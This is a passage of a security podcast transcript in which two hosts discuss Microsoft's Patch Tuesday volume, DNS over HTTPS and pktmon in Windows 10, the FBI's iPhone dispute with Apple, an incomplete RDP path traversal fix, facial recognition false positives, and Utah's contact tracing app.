STEVE:  Okay.  Well, a Class C subnet mask, yes.  You really probably did, when you think about it, you want a Class A subnet mask.



LEO:  Oh, yeah.  That's what we're going for.



STEVE:  If you're going to be trusting your health to it.  So of course this guy got the best he could, I guess.



LEO:  Yes.  This is just IPv4, I mean, no big deal.



STEVE:  Yeah, exactly, yeah.  So last Tuesday's patching round was not the biggest ever.  But it was the third largest in Microsoft's history.



LEO:  What?



STEVE:  Weighing in with a whopping 111 CVE tracked bug fixes.



LEO:  They did 113 last month.  This is crazy.



STEVE:  Yes, Leo, and 115 the month before.



LEO:  Wow.



STEVE:  Sixteen of this month's 111 were rated critical, and all but one enabled remote code execution by an attacker.  In a refreshing change of pace, however, none were zero-day flaws.  We've been having those recently.  Not this month.  But think about this.  If things have been seeming worse recently, and they have been, it turns out it's not our imagination.  Because as you noted, 115 bugs were fixed in March, making it the number one largest number of bugs in Microsoft's history, and 113 a month after in April, that is, last month, with 111 this month.



LEO:  Crikey.



STEVE:  So the past three months - March, April, and May - were the first, second, and third most patched bugs in Microsoft's entire history.  And although this month's bugs spanned 12 different Microsoft products, from Edge to Windows and Visual Studio to .NET, nearly half were problems within Windows itself.



LEO:  So it's a big code base.  How big are these bugs?  I mean, are they just little errors or...



STEVE:  Well, and that's really - that's a perfect question.  So I'm glad that these oversights were being fixed.  And I'm glad that whatever it is that is wrong doesn't appear to be affecting my own work when I'm using Windows 10 because I sit in front of Windows 10 every evening.  That's what I have in my location with Lorrie.  So perhaps these are all just exploitable edge cases.  And since I was wondering exactly that, I took the time to read each and every one of this month's 111 descriptions.



LEO:  Oh, god.  Oh, my god.



STEVE:  Yes, dear podcast listener, I did that for you.



LEO:  How painful.



STEVE:  I made a note of what it was that was wrong and was fixed.  Every one of the 111 problems was exactly one of the following:  remote code execution vulnerability.



LEO:  Not good.



STEVE:  Denial of service vulnerability.



LEO:  Not good.



STEVE:  Elevation of privilege vulnerability.



LEO:  Very not good.



STEVE:  Cross-site scripting vulnerability.



LEO:  Terrible.



STEVE:  Memory corruption vulnerability.



LEO:  Oh, my god.  They're all bad.



STEVE:  A spoofing vulnerability.



LEO:  Oh.



STEVE:  Or an information disclosure vulnerability.



LEO:  They're all terrible.



STEVE:  Well, they're all bad.  But among those 111 problems there was not a single one that was not a vulnerability.  So this suggests that it's not that Windows 10 is not working.  I mean, there are problems, like we've seen with upgrades having to be backed out of, and things going wrong because of some screwy AV system they've got or something.  As we know, for the most part, it works.  And I'm sure that most of us listening to this podcast, although we had a bunch, you know, thinking about the crowd that we had in Boston, Leo, sort of a representative demographic of the podcast, there was a range of ages.  There were young bucks and old-timers.



But those old-timers among us certainly recall those days using the early versions of Windows when it would just lock up at any time, without any apparent cause, and always without warning.  Some of the losses that resulted were so traumatic that to this day, today, I'm not kidding you, decades later, I'm still hitting CTRL+S for Save...



LEO:  Yes, that's right, yes.



STEVE:  ...before I ever switch away from anything I'm doing.



LEO:  Oh, yeah.  Habitually.  Every minute.



STEVE:  I'm still not willing to trust that I'm going to be able to come back.



LEO:  But you're right.  Those things don't happen as often.  The hard crashes, the data loss.



STEVE:  I would say I spend most of my time in front of Windows 7.  What I'm noticing is that the video driver crashes.  But it's like everything freezes for a minute, and I go, okay, what's this?  And then everything goes blank.  And then it kind of comes back.  Well, it couldn't used to do that.  I mean, if the video driver crashed, it was blue screen.  Now it's like, ooh, ow, hold on a second.  And then it, like reconstitutes itself.



LEO:  Well, they rearchitected with NT, and they really do protect Ring 0 much better than they used to.  It's a lot harder to bring the system down.



STEVE:  The one thing we still have today, I would argue that my incessant CTRL+S'ing is probably, from a rational standpoint, it's really not that necessary.  But CTRL+C, the thing we have now is that that doesn't always take.  And so I noticed that, if I want to make sure that I copy something to the clipboard, now I'm hitting CTRL+C a bunch of times, just because one doesn't seem to be enough to give Windows the idea that, oh, no, he's serious.  He really does want this on the clipboard.  It's like, okay, fine.  But anyway, in the case of the myriad vulnerabilities that we've seen, certainly in this past month, we have - I guess I'm feeling like Windows 10 works.  But you really, as you were saying, noting the nature of these vulnerabilities, you really don't want to expose it to too much incoming because that's not going to have a happy ending.



LEO:  Do you think it's because there are more security people trying to find these bugs than ever before?  That must be some of it.



STEVE:  I do think so.  And Leo, they just - they, Microsoft, will not leave it the eff alone.



LEO:  Well, that's true, too.



STEVE:  Just stop effing with Windows.  Let it settle.  Let it stabilize.



LEO:  But they're always adding stuff.  They can't leave it alone.  And that also speaks to the poor quality of the code base because everything's interdependent.  So you change something here, and suddenly your wallpaper can't resize or something bizarre; right?



STEVE:  Exactly.  Something, some obscure, like, okay, I can't set dark blue anymore.  What?  



LEO:  Yeah. That stuff should not be interdependent.  It really shouldn't.  But, you know.



STEVE:  I did have a really, really good friend who got his comp sci degree from MIT.  He was at Berkeley for a while.  And he went to Microsoft.  And as he was leaving, he said, "Oh, this is gonna blow.  It's gonna blow.  Run a bypass, quick."



LEO:  Oh, there's patch upon patch upon patch upon patch.



STEVE:  Oh, boy.  Yeah.  So get somebody to filter your email externally, if possible.  Use a well-curated web browser.  If you're going to go to anywhere sketchy on the Internet, do that in a VM.  VMs are easy now.  They're free.  We've been talking about various VM solutions.  Pass anything that you download while you're in the VM through VirusTotal before you even consider moving it out of the VM.  And then revert any changes that you made to the VM while you were using it.



LEO:  Sure.  Uncle Joe's going do that.



STEVE:  That's not completely necessary.  But in the past three months, just the past 90 days, 339 vulnerabilities...



LEO:  Incredible...



STEVE:  ...have been patched.  And a number of them were being exploited at the time that they got fixed.  So, as I said, it works.  But you just don't want to subject it to too much incoming because, yeah, not good.



LEO:  I mean, do you think if you wrote something from scratch -  it's just such a hairball of a thing.



STEVE:  Oh, Leo.  There is no one on Earth who now understands it.  And that's a problem.



LEO:  That's a problem, yeah.



STEVE:  At least we have Linus, who still is sitting on top of and incubating Linux, the Linux kernel.  But there's nobody.  This thing is out of anyone's ability to comprehend.  And of course that's part of the problem.  We were talking recently about how there is a problem with, when we have a big project, you're inherently needing to rely on other people's code.  You're grabbing libraries for this and that, Node.js here and some other module there, in order to glue together a solution.



So what that means is that you don't understand.  You didn't write all that.  You don't understand it all.  You're assuming, hoping that these various pieces each behave themselves.  That's Windows now because just once upon a time - we talked about this, I still shed a tear - when I actually knew what my files were.  We have computers now, we just sort of scroll through the endless System32 and the "x by x," whatever that is that's now 25 gigs of something.  And it's just like, okay, I just give up.  I don't know what any of this is.  Just please don't have it hurt me.



LEO:  I think some of this is a legacy of - there was a period of about 20 years where we were infatuated with some - there were some very bad fads in coding.  Like object-oriented coding.  And I think we were infatuated with this stuff.  And I think C++, I think some of this is the legacy of some just bad technologies that are going away now, frankly.



STEVE:  And frankly, I mean, to Microsoft's credit, legacy is their middle name.



LEO:  Right.  You can't dump it.



STEVE:  Once upon a time they were getting a graphical user interface to run in a system with 640K.



LEO:  Right, exactly, yeah.



STEVE:  And so that's where the DLL was born.  That crime against civilization came from the fact that you had no choice back then to share code.  So the idea was that you'd have these blocks of code that apps would - basically an app was just a script that was calling functions in external dynamically linked libraries.  And there was only one instance of this DLL in RAM so that it wasn't taking up space.  To their credit, they got an amazing system to function in a zero resource environment.  The problem is then, like, they couldn't leave, like, okay.  That was version 1 of the DLL.  Oh, but we're going to add a few more things and make it version 2.  But then of course it broke compatibility with version 1.  So then remember how you would install some new program, and things that were already installed stopped working?  So that happened...



LEO:  All the time.



STEVE:  ...because of DLLs colliding with each other.



LEO:  All the time.  I got calls so often on the radio show, and the answer would be, oh, you installed the DVD burning software.  That DLL clobbered the DLL that your word processor was using.  And so that's why you can no longer get email.  And it was like, oh, so frustrating.



STEVE:  At least we left IRQs behind. 



LEO:  Yeah, I know.



STEVE:  I mean, half of your career, Leo, was IRQ conflicts.



LEO:  No kidding, it really was.  So depressing.  I think it's getting better.  I really do.



STEVE:  Well, no.  I mean, I totally agree with you.  I never, I mean, I'm not on the bleeding edge of anything, but my systems never lock up or crash.  They just go.  Sometimes they get wounded, but they seem to heal themselves.  It's like, oh, okay.  That was good.  That's a little bit of magic.  So, yeah, I just...



LEO:  It's amazing.



STEVE:  Yeah.  They are huge lumbering machines.



LEO:  They are.



STEVE:  So, okay.  Speaking of Windows 10, here I'm complaining that Microsoft doesn't leave it alone, and then the next thing I talk about, this happened now several podcasts, it's like, ooh, listen to this new feature that Windows 10 is getting.



LEO:  You see?  You see?  You see?



STEVE:  Okay.  So DoH...



LEO:  They do it for you, Steve.



STEVE:  ...which is to say DNS over HTTPS test drive is appearing for Windows Insiders.



LEO:  That's really interesting.  That's surprising.



STEVE:  Yeah.  I know.  And they really jumped on this quickly.  Without indicating when they would be giving this a wider release, Microsoft is letting Windows Insiders test drive DNS over HTTPS in the Insider Preview Build 19628.  So you need to be on the Fast Ring.  You need to be all on the jiffy spiffy quick, last night's build, hold your breath and boot.  But the key number is 19628 and subsequent.



Last Wednesday Microsoft wrote:  "If you've been waiting to try DNS over HTTPS (DoH) on Windows 10, you're in luck."  Luck was actually not involved, but fine.  "The first testable version is now available," they wrote last Wednesday, "to Windows Insiders.  If you haven't been waiting for it and are wondering what DoH is all about, then be aware this feature will change how your device connects to the Internet and is in an early testing stage.  So only proceed if you're sure you're ready."  On the other hand, it doesn't do anything to you.  You've got to go ask for it.



So Microsoft first indicated their intent and their interest when we talked about this last November.  And as opposed to our browsers that are only offering this for browsing, this is at the OS level.  So all browsers, without any configuration, everything else you do, email, any other utilities that are doing DNS lookup, they all get protected.  So this will be native for all of Windows' DNS queries.  And where DNS is of course ubiquitously available from every ISP over the UDP protocol to port 53, DoH is not yet universal.



So the first question anyone has is what DoH provider does Microsoft use?  Now, I went digging because I was curious about this.  Turns out there is a proposal in the works for adding a DoH type to DHCP.  So just as our systems today are able to auto configure to our providers' old school traditional DNS, when a DoH type becomes supported by ISPs and routers and PCs, then the same kind of auto-configuration can occur when an ISP chooses to support DoH with their own server.  But until that time, it's up to the user to decide which external DoH provider to use.



And in Microsoft's case, three providers are currently supported to be used as DoH resolvers:  Cloudflare, Google, and Quad9.  The way this works is kind of clever.  Windows needs to be configured to use one of these as a DNS server, sort of through the normal DNS settings.  DoH is disabled by default in this preview build.  You need to do some, believe it or not, registry tweaking.  This doesn't surface at the UI at all.  I've got the specifics in the show notes.



You go to, for those propeller heads among us, HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services.  Under that is Dnscache, and under there is Parameters.  So in the Parameters key under the Dnscache key under Services, you create a new DWORD named "EnableAutoDoh" and set its value to 2 for some reason.  I don't know what 1 does, but 2 is what we're told to do.  This enables DoH.



And so as long as you have your Windows machine configured to use Cloudflare's normal DNS or Google's normal DNS or Quad9's normal DNS, when Windows is restarted, rather than sending normal DNS to one of those three providers, it sends DoH DNS, DNS over HTTPS.  So it's kind of clever.  I liked how, at the UI level, you just say, okay, I want to use Cloudflare's DNS, Google's DNS, Quad9's DNS.  And then if you also have it set to EnableAutoDoh, when Windows realizes that it's about to make a DNS query to one of those three, it goes, oh, and instead establishes - and probably does it persistently because you want that, in order to be processing many DoH lookups per second - it establishes an HTTPS connection to that provider, and then that's its tunnel through which the entire OS then resolves its DNS queries.



Oh, and if you want to set up a DoH server that isn't already on what Microsoft calls their so-called "auto-promotion list," meaning that those are the DNS queries to an IP that are auto-promoted to DoH because for example maybe your corporate Intranet supports it, although there's really arguably not a big need for DoH over a corporate Intranet because it's really only when it goes outside of your control; or if your ISP started to support DoH and you wanted to use it, just because sort of in the spirit of not aggregating all DNS down to a very few providers, you can do that, there is a command line.



Those who have messed with a command line are familiar with netsh.  So you say netsh - and again, in the show notes, the details - space dns space add space encryption space server= and then the IP address that you want Windows to notice and then convert from DNS to DoH, and then the so-called "dohtemplate."  So you do IP address space dohtemplate= and then that server's URL template.  They call it the DoH-URI-template, and that's all of the DoH servers have it.  It's https:\\, you know, who knows what it is, like doh.cloudflare.com or whatever.  I just made that up.  That's not what it actually is for Cloudflare.  And so that's the HTTPS URL to which a persistent connection is made to then establish the tunnel.  And you can type something similar in order to query whether the IP address got registered:  netsh dns show encryption server= and then the IP address you're querying, and it'll let you know if it has registered that IP in its auto-promotion list.



So anyway, I'm delighted that Windows jumped on this as quickly as they did, or that Microsoft jumped on this for Windows 10 as quickly as they did.  It just makes it a no-brainer.  You don't have to worry about, I mean, I guess our browsers are going to begin doing it, so they'll be establishing their own tunnels, ignoring what Windows is doing.  But at least then that means that the rest of what Windows is doing will also be DoH to the provider of your choice, based on how you've configured Windows; or even to your own local ISP at such point as they start supporting it.



So how do you know it's working?  The standard answer would be to use some sort of network sniffer.  Microsoft has a network monitor that you can download separately, or of course the perennial favorite is Wireshark, which continues to evolve and move forward.  But an intriguing option is to use Windows 10 little-known built-in and completely undocumented packet monitor which is pktmon.  If you're in front of a Windows 10 machine, open a command line or any form of command prompt and type "pktmon" ENTER, and you will be treated with a little help screen showing you the list of available verbs to follow pktmon with.  And you can add help to the end of any of those and get help on those, and basically explore the command tree of a built-in packet monitor.



It was quietly added with zero fanfare, as I noted back in the October 2018 Windows 10 feature update.  And with this month's forthcoming Windows 10 2004 - boy, is that a confusing number - feature update, it will be gaining a little bit more capability.  Right now it can run counters, which you can then examine.  Or it can log packets to a log file, which can have its format converted.  With Windows 10 2004 feature update, you'll be able to have it dump its captures directly to the screen, which will be very cool.  It'll just give you a very quick real-time display of stuff happening.



So, for example, if you were to start - say that you wanted to find out whether in fact your system was still issuing any old-school UDP.  You might start by saying "pktmon filter remove" to clear any old filters that you might have around.  Then you'd say "pktmon filter add -t UDP," saying that I want to capture the UDP transport, and then " -p 53" for port 53, which we know is DNS.  So that would add a filter to capture all traditional DNS over UDP queries.  Then you say "pktmon start," which will initiate the filter and begin running counters, which will be incremented for any packets that match the filters.  If you wanted to, you could do "pktmon start --etw," which will tell it to start the filtering and capture packets into a pktmon.etw file.  And there are other parameters for all these things.  So you can, like, give it a different filename if you wanted.



So what I did last night when I was playing with this was that I then had my browser - I poked around.  I went to an NY Times page thinking, okay, that's going to be full of DNS queries.  It's going to be pulling crap from 200 different domains.  And then I came back to the command window and said "pktmon stop."  And I got a dump - I have it in the show notes for anyone who's curious - a dump of all of the capture events which occurred for UDP port 53 during the period of time that things were running.  So it's just very cool.  It shows you all of the different stages of drivers in your various stack.  You can type "pktmon comp list" to list all the registered components in your system's network driver stack, which is amazing.  There's just a bunch of stuff there.



But anyway, it's a terrific little built-in tool.  You don't need to add anything else to your Windows 10 system.  Everybody's got it since the October 2018 update.  And it can quickly let you know, just for any kind of purpose, what your network is doing.  If it captures your imagination, BleepingComputer's Lawrence Abrams has reverse engineered a few additional tips and tricks.  As I said, there's no documentation anywhere.  Microsoft did refer to it in their DoH article, which is probably what put both Lawrence and me onto it.  Lawrence took the time to go down every command path.  And anyway, he did find out a bunch of additional things.  So anyway, just a little hidden gem in Windows 10.  Very cool built-in utility.  Because, again, you could install Wireshark and go that route.  But this is already there.  



So the DOJ and the FBI during a press conference yesterday criticized Apple yet again over encryption.  And boy, this was sort of - it was a weird comment that I'll highlight here.  I just didn't want to, I mean, we know what it's about.  I just didn't want to fail to touch on the fact that William Barr, who of course is the current head of the U.S. Department of Justice, announced - and I thought this was interesting - that FBI technicians had finally, after four months and "much expenditure of taxpayer dollars," managed to crack and gain access to the two locked iPhones belonging to last December 6th Pensacola naval air base shooter Mohammed Saeed Alshamrani.



During the press conference, FBI's director Christopher Wray criticized Apple for not helping its investigators to unlock the two phones.  Wray said the entire process of cracking the terrorist's two iPhones took four months and "large sums of taxpayer dollars."  So they were both harping on this.



LEO:  Where did that money go, do you think?



STEVE:  Exactly, Leo.  Since actual cracking itself doesn't cost anything more than the time and skill, either the FBI techs were extremely well paid during this arduous past four months, or more likely the FBI went outside to purchase the golden keys for those two iPhones.  And remember that one of the two phones had been shot by Alshamrani.  I was amazed when we first talked about this that they were able to get it going again.  It's like...



LEO:  He must have missed.



STEVE:  You could shoot an iPhone, and it still lights up?  That's amazing.



LEO:  He missed the memory.



STEVE:  In any event, the DOJ said that, following the FBI's success, they were able to link Alshamrani to an Al Qaeda branch active in the Arabian Peninsula, which I guess is no surprise because those were his people.  William Barr said:  "We now have a clearer understanding of Alshamrani's associations and activities in the years, months, and days leading up to the attack."  And I should clarify that this guy was sort of like on base for some training here in the U.S.  



LEO:  He was a Saudi national, right, to be trained, yeah.



STEVE:  Yes.  Yes, yes, exactly.  Anyway, however, FBI director Wray said that the investigation could have advanced sooner if Apple had helped the FBI's technicians.  Wray said that despite public pleas from both President Trump and Attorney General Barr, Apple did not cooperate in the investigation.  But then, in an immediate contradiction, Christopher Wray continued:  "Apple made a business and marketing decision to design its phones in such a way that only the user can unlock the contents, no matter the circumstances."



LEO:  Shocking.  Shocking.



STEVE:  "Apple's desire to provide privacy for its customers is understandable, but not at all costs."  So first he's  complaining that Apple refused to cooperate with this specific case, despite pleas from top administration officials.  And with the next breath he's complaining that Apple chose to design their phones in such a way that it was impossible for them to comply.  So I think we need to read this nonsense as the continuing drumbeat toward the inevitable collision of consumer encryption technology and legislation, which will somehow criminalize the use - or the sale, probably, because I doubt you're going to blame the user - of subpoena-proof encryption.



We might imagine that this could take the form, for example, of some spiffy penalty legislation where, for example, any manufacturer of a consumer electronics device produced for sale within the United States will have 30 days to comply with a lawfully issued subpoena to decrypt and provide all data contained within the device to law enforcement.  After which a significant fine, who knows, perhaps some percentage of that company's annual revenue, so that it sort of auto scales to the size of the company, would be levied against the company for each additional day beyond the initial 30 days that the device's decrypted contents are not provided to law enforcement.  I'm just making that up.  And of course that would be for devices sold, beginning to be sold after some certain date so that companies had some opportunity to change the way they have decided to have their devices operate.



I did like the EFF who, as always, weighed in, noting that the very fact that the FBI was able to crack the iPhones to obtain all of its information argued against the need for any change to the existing status quo.  So thank you, EFF, for always being there.



LEO:  Oh, boy.



STEVE:  So anyway, again, I mean, they just, like, they wanted to announced their victory and to also pound Apple over the head and also drive another stake into the whole encryption debate.



So when is a fix not a fix?  All too often, Leo, it's when path traversal attacks are involved.  Yes, we were just talking about this, last week or a couple weeks ago, you and I, about the original sin of hierarchical directory design.



LEO:  Oh, yeah, ..\.., yeah.



STEVE:  With its, yes, exactly, its inherent "dot dot" to refer to the parent directory, which allows you to traverse back up the hierarchy and then back down.  And of course that's not itself as much of a problem, well, except that then security constraints were placed on hierarchy, cleverly, but still ouch, as it turns out, on nodes in the hierarchy such that descendents of a security policy that exists at a branch in the branching directory hierarchy are then inherited by all of the objects downstream of the branch.  So it's very powerful.  You could argue it's very cool.  And Windows inherited the same architecture, I mean, because it is very powerful. But oh, my god, has it been a source of security problems.  And as the saying goes, what could possibly go wrong?



In this week's installment of what did actually go wrong, we learn that when Microsoft fixed their reverse RDP (Remote Desktop Protocol) attack problem last July, and then tried to do it again this past February, it was never really fixed, at least not for everyone.  So backing up a bit, recall that last summer several attacks against Microsoft's RDP protocol came to light.  There was a serious authentication bypass against the server, which led to last summer's spate of attacks against vulnerable RDP servers.  And also there was, separately, a path traversal vulnerability that could compromise an RDP client which made the mistake of remotely connecting to a malicious RDP server.  And I noted at the time that that one seemed significantly less worrisome since someone using RDP to access a server other than their own seemed less likely.



So this all came to light after Microsoft first patched the vulnerability as part of its July 2019 Patch Tuesday update last summer.  But later it turned out that Microsoft only thought that they had resolved the problem.  Researchers at Check Point were able to bypass that patch simply by replacing the backward slashes in the path with forward slashes.  The researchers explained that the July patch can be bypassed because of a problem that lies in its path - and here's a word, well, I'm blanking on the word because it's canonicalization.



LEO:  Yes.



STEVE:  A mouthful.



LEO:  Canonicalization.  That's it.



STEVE:  The path cannot - I can't say it.  Canonicalization.



LEO:  There you go.



STEVE:  Path canonicalization...



LEO:  There should be a better word than that.  That's terrible.



STEVE:  Well, people like them.  Yes, well, so it's path - the actual API call is PathCchCanonicalize, which is used to sanitize file paths.  This allows, that is, the failure for them to properly canonicalize paths...



LEO:  Very well done.



STEVE:  ...allows a malicious attacker to exploit the clipboard synchronization which exists between an RDP client and its server to allow the server to drop arbitrary files in arbitrary paths on the client machine.  Thus the clipboard redirection feature, while connected to a malicious compromised RDP server, allows the server to use the shared RDP clipboard to send files to the client's computer to achieve remote code execution of any code that the server wants to shove down the client connection.  And although the Check Point researchers had originally confirmed, and quoting them:  "The fix matches our initial expectations," back when it appeared in July, it appears that didn't actually fix the problem.  The patch can still be bypassed, as I mentioned, by replacing the backward slashes, you know, file\to\location, in any paths with forward slashes, just turning them into leaning right slashes, which are, as we know, the path separators used in Unix-based systems.



The researchers explained:  "It seems that PathCchCanonicalize, the function that is mentioned in Windows' best practice guide on how to canonicalize a hostile path, simply ignored the forward-slash characters."  They said:  "We verified" - I know, Leo.  It's just amazing.  "We verified this behavior by reverse engineering Microsoft's implementation of the function, seeing that it splits the path into parts by searching only for '\' and ignoring '/.'"



After this was pointed out, Microsoft acknowledged the incomplete fix and repatched the flaw three months ago in its February 2020 Patch Tuesday update.  But in the latest chapter of this ongoing saga, a Check Point researcher observed that Microsoft addressed the issue by adding a separate workaround in Windows while not actually repairing the underlying cause of the bypass issue in the PathCchCanonicalize function.  The upshot of this is that, while the workaround apparently works fine for the built-in RDP client in Windows operating systems, the patch will not protect and does not protect any third-party RDP clients - and there are many - against the same attack that relies upon the vulnerable Path Canonicalize sanitization function developed by Microsoft.



Check Point wrote:  "We found that, not only can an attacker bypass Microsoft's patch, but they can bypass any canonicalization function check that was done according to Microsoft's best practices," which uses that API call.  "As a result, a remote malware-infected server could take over any client that tries to connect to it."



And as I was doing the research in this latest bit of annoyance, I had the sense, and I'm sure our listeners do, and I know you do, Leo, because I've heard you moaning, that someone was not really paying attention over at Microsoft.  We heard last year that they were really taking a much-needed long look at RDP and their other exposed server protocols, and that sounded like all good news.  But the persistent incomplete "solving," in quotes, of this problem made me aware that as buggy, vulnerable, and patch-needy as Windows has become, at least we've always had the sense that the developers at Microsoft were quite highly skilled.  And frankly, they need to be, to keep Windows moving in a more or less straight line.  If that should ever change, Windows is done for.  And you've got to wonder about someone just like not changing, not fixing the actual functions.  Like they didn't read the whole memo.



LEO:  Or they were in a hurry; or, yeah.



STEVE:  They just read the beginning of it.



LEO:  It seems sloppy.



STEVE:  Yeah, yeah.  I mean, and sloppy will be the death of Windows, Leo.



LEO:  Oh, yeah.  Oh, yeah.  



STEVE:  The only thing that they've got going for them is they've got highly skilled developers because they have built, I mean, the term is "a house of cards."  And as long as you're placing each card very carefully onto the existing monstrosity, okay.  But if someone comes along and doesn't appreciate the delicacy of this thing, boom.



LEO:  Boom.



STEVE:  So it turns out LFR is unfortunately an abbreviation we've going to be needing to learn.  It stands for Live Facial Recognition.  Its initial trial program used in London has been controversial, with the biggest problem being, aside from just the creepy Big Brother aspect of being monitored and surveilled without your explicit consent, the biggest problem is that, in the best of times, even before everyone was wearing COVID-19 masks, or subnet masks, the system was causing more trouble than it was worth, due to its extremely high palse fositive - boy - false positive rates...



LEO:  I have those palse fositives.  Yeah, I hate those.



STEVE:  For any of you who have improperly canonicalized this sentence, coming in as high as 90% in two recent LFR (Live Facial Recognition) deployments in which over 13,000 faces were scanned.  Six individuals were stopped as a result of a match, five of whom had been misidentified by the system.



LEO:  Ooh, that's not good.



STEVE:  That's not good.  Civil rights groups say there is no clear legal basis for scanning the faces of potentially millions of citizens in the hope of catching a few people, with fears  that a wholesale rollout could contribute to a shift toward a surveillance state model adopted in countries such as China.  This was all happening in London.  And I can say, I mentioned this during our Thursday panel last week, that it was with a little bit of surprise, but then I of course realized that my own well-trained iPhone looks back at me with a great deal of puzzlement when I hold it up to my masked face.  It's like, uh, no.  You're going to have to do better than that or type in your InstaCode by hand.



LEO:  Who are you?  You are?  What's your subnet?



STEVE:  Yeah.  So as long as wearing face masks is considered polite, bad guys wishing to avoid any chance of automated recognition can appear to be acting with full social responsibility by wearing a mask when they're getting about some business which is probably not socially responsible.  And I guess it must come down to the question of whether people have, as we know the term is, a "reasonable expectation of privacy" when they're out in public.  And so law enforcement argues that, well, if you're in public, you don't have an expectation of privacy.  Although, Leo, what's the law with taking pictures of people?  Because sometimes we see people's faces blurred out when they're in public settings.



LEO:  Yeah.



STEVE:  Clearly to protect their identity.



LEO:  So photographers are allowed to take pictures of people in public without permission.  But I remember when I worked at NBC that they wanted releases of anybody that would be shown on camera on NBC, regardless of where the location was.  And they said, even if they're turned around, if your mother could recognize you, then we want a release.  But that may have just been lawyers being overly proactive.  And it is the case that responsible photographers, we always tell people, ask permission.  Don't just go around shooting.  But I don't think technically you have to.  A mall, that's not a public place.  Some sidewalks in front of buildings may not be public.  But a truly public place, yeah, you could take pictures.  You have no expectation of privacy.



STEVE:  Oh, that's interesting.  I'm surprised that a mall would not be considered public.



LEO:  Oh, yeah, that's not.  That's privately owned.  So you can be kicked out of a mall.  You can be kicked out of a lot of places - train stations, airports.  I've been kicked out of the best.



STEVE:  I don't want to know how you know that, Leo.



LEO:  They don't, they really don't like you taking pictures.  And if you're taking pictures at a power plant from the street, from a public area, you will get stopped.  And, I mean, you have a legal right; but at the same time I don't know how much you want to assert that.



STEVE:  Well, and we know, for example, that there are blackout zones in certain areas of the globe where satellites are not allowed to be surveilling.



LEO:  Well, yeah.  Yeah, this only applies to the United States.  Your rules may vary.



STEVE:  So Utah has done what I expect lots of states to do.  They have chosen to roll their own COVID virus contact tracing app.  To me it makes sense.  They call it "Healthy Together," and it's on the App Store, both iOS and in Google Play.  



LEO:  So it doesn't - it's available now.  That means it doesn't use the API, the Google/Apple API.



STEVE:  Correct.  It does not.



LEO:  They have their own thing.



STEVE:  It was created by a startup called Twenty Holdings, who is best known for their - well, they're not very well known.  But if anyone knows them, I'm sure their mother, it's "Twenty - Hang Out With Friends."  It's a social app which allows users, in their words, to "See who's around, see who's down, and hang out."



LEO:  Oh, dear.  Oh, dear. 



STEVE:  So the company already, I'm sure this is what happened, they already had a platform for enabling physical in-person connections.  So they thought, hey, we already have a contact dating app.  We can easily convert it into a contact tracing app.



LEO:  Sure.  



STEVE:  So their Healthy Together app uses everything it can get its hands on, including physical location data, including GPS, WiFi access point proximity, cellular phone tower triangulation, and Bluetooth.  Its goal is to pinpoint its opt-in users' locations and their location history and ID coronavirus breakouts and hotspots.  And I've got to say, for those who are civic-minded and who do not mind the privacy implications of explicit historical tracking, since that's clearly what's going to be necessary for dealing with outbreaks, that is, at the state health services level, they want more than just individual, oops, I may have been near somebody who was positive.  So am I really going to self-quarantine for 14 days?  For me, I think this makes a lot of sense.  There's nothing I'm doing in my life that's the least bit controversial.  I mean, it's going to see this boring loop between my two work locations at this point.  And my one tank of gas lasted I think two months, last time I filled.



LEO:  Yeah.



STEVE:  So I personally would not hesitate to add that to my phone for the duration.  Of course you're free to delete it any time you want to.  If I were to become infected, and my location and time history could be played back to determine when and where that occurred, and everyone else who was also present in the same group at the same time could then be interviewed and checked, that would prove to be...



LEO:  Fine.  Yeah, yeah.



STEVE:  ...of vital use for health.  And if, as it looks like, we are going to be reopening, and people are not going to be practicing the kind of safety that they need to based on some  of what we're seeing currently with high-density restaurants and no one wearing masks, then I would argue that the responsible thing to do, the flipside of that, is okay, then opt into something like this so that your state can zero in on outbreaks and proactively notify you that, hey, you know, you were here at this time.  Thank you for letting us know because now we're able to let you know you need to be very careful.  Like we'd love to have you come in and just get swabbed to see whether you might have the virus, but be asymptomatic, assuming that you're not showing symptoms.



The point is you really need something like this.  They have a site, it's coronavirus.utah.gov/healthy-together-app.  And it says of the Healthy Together beta app, they say:  "Protect yourself and your family.  Utahans are working to slow the spread of COVID-19.  We can work together to protect our family members, friends, health workers, and our communities.  The Healthy Together app helps you assess your symptoms, find the nearest testing center" - of course that means they know where you are, nearest testing center - "view test results, and learn what to do after you've been tested for COVID-19." 



So they have four bullet points there up at the top:  "Assess your symptoms.  Use the symptom checker to see if you need to be tested.  Two, find the nearest COVID-19 testing center.  Testing centers are located across the state.  Three, learn what to do after you get tested.  Get your test results and instructions for care.  And, four, location data.  Find COVID-19 hotspots to focus public health efforts."  And so they gave themselves a bit of a Q&A.



Question:  "How does the Healthy Together beta app help protect me and my family and slow the spread of COVID-19?"  Their answer:  "The Healthy Together beta app helps you assess your symptoms, find the nearest testing center, view test results, and learn what to do after you've been tested for COVID-19.  We can work together to slow the spread of COVID-19 and protect our family members, friends, health workers, and our communities.  If authorized by the user, the app can also provide location data to public health workers, providing them with a faster and more accurate picture of where and how the virus is spreading within our community to focus public health efforts."



Question:  "What happens to my data?"  Answer:  "Protecting your data is of utmost concern to the State of Utah; and the developer, Twenty, to ensure the privacy and security of the data, will follow these principles and limitations:  Using the app is strictly opt-in and voluntary.  You own your data and can delete it at any time.  Only data required to combat COVID-19 will be shared with public health officials.  Location data is automatically deleted after 30 days.  Symptom data is automatically de-identified after 30 days.  The developer will comply with state requirements for data security and encryption.  You can decide what data you would like to share, for example, Bluetooth data, location data, or contact lists."



Question:  "Who has access to my data?  Is the data shared with any third parties?  What details are shared?"  Answer:  "Your data is secure, and you are in full control of what you choose to share.  Only data that is useful to combat COVID-19 will be shared with public health officials.  While the state will have access to your symptom data, location and Bluetooth data will only be released to the state should you test positive for COVID-19."  Now, that's a little limiting, in my opinion.  Maybe you can share it otherwise because I'd like to be notified if I was in an area at a specific time when they believe the result of this demonstrates there was active virus in the air at that time, or on contact surfaces.



Anyway, question:  "Which public health officials will have access?"  Answer:  "Utah has trained a team of contact tracers under the Utah Department of Health who will reach out to people who have tested positive for COVID-19 and have been potentially exposed to the disease.  When you grant access to your location or GPS and Bluetooth data, members of this team will be able to access your data to help in the contact tracing process.  The app will help these professionals identify transmission zones, contact patterns, and other vital information to inform their research.  So vital epidemiological data."



